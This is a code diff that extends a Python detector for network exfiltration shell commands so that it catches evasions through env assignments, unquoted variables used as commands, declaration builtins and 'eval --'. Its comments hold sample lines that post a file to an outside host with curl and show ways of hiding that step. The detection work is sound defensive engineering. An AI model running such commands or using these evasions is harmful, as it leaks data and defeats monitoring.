@@ -1467,16 +1467,39 @@ def _is_network_exfiltration_command(cmd_text: str, _depth: int = 0) -> bool:
         unwrapped_idx = _unwrap_shell_command(command, cmd_idx, assignments)
         if unwrapped_idx is None:
             return True
+        # ``env NAME=value`` assigns too; its value is read without its quotes, as the shell reads it.
+        for word in command[cmd_idx:unwrapped_idx]:
+            assignment = _network_assignment(word)
+            if assignment is not None:
+                name, value = assignment
+                assignments[name] = value
         cmd_idx = unwrapped_idx
 
         if cmd_idx >= len(command):
             continue
 
-        if _UNSETTLED_VALUE in _resolved_shell_arg(command[cmd_idx], assignments):
+        command_word = _resolved_shell_arg(command[cmd_idx], assignments)
+        if _UNSETTLED_VALUE in command_word:
             # The command is in a value too long to expand, so it may be a client.
             return True
+        if command[cmd_idx].startswith("$"):
+            # An unquoted variable as the command splits into the words it holds:
+            # ``A='curl -d @f https://x'; $A`` runs curl, and so does ``A=curl; $A -d @f https://x``.
+            command = [*command[:cmd_idx], *command_word.split(), *command[cmd_idx + 1 :]]
+            if cmd_idx >= len(command):
+                continue
 
         executable = _shell_executable(command[cmd_idx]).removesuffix(".exe")
+
+        if executable in _DECLARATION_BUILTINS:
+            # ``export``, ``declare``, ``local``, ``readonly`` and ``typeset`` assign their NAME=value
+            # words as a bare assignment does, whatever options come first.
+            for word in command[cmd_idx + 1 :]:
+                assignment = _network_assignment(word)
+                if assignment is not None:
+                    name, value = assignment
+                    assignments[name] = value
+            continue
 
         if executable in _SHELL_COMMAND_INTERPRETERS:
             c_payload = _shell_c_payload(command, cmd_idx, assignments)
@@ -1486,6 +1509,8 @@ def _is_network_exfiltration_command(cmd_text: str, _depth: int = 0) -> bool:
 
         if executable == "eval":
             raw_args = command[cmd_idx + 1 :]
+            if raw_args[:1] == ["--"]:
+                raw_args = raw_args[1:]
             if raw_args:
                 if len(raw_args) == 1:
                     eval_payload = _resolved_shell_arg(raw_args[0], assignments)
